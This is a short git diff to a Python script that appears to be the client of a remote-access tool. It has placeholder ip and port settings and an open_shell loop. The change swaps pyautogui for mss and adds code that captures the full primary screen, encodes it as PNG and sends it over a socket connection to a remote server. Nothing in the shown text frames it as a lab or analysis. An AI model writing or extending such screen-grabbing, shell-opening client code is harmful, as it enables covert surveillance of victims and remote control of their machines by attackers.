@@ -3,14 +3,20 @@ import sys
 import os
 import time
 import subprocess
-import pyautogui
+import mss
+
 
 ip = ""
 port = 0
 
 def take_screen_shot():
-    img = pyautogui.screenshot(time.asctime(time.localtime(time.time())))
-    
+    if len(mss.mss().monitors) > 0:
+        raw_pixels = mss.mss().grab(mss.mss().monitors[0])
+        img_data = mss.tools.to_png(raw_pixels.rgb, raw_pixels.size, 0)
+
+        server_con.sendall(img_data)
+        server_con.sendall(b'DONE')
+        del(raw_pixels, img_data)
 
 def open_shell():
     while True:
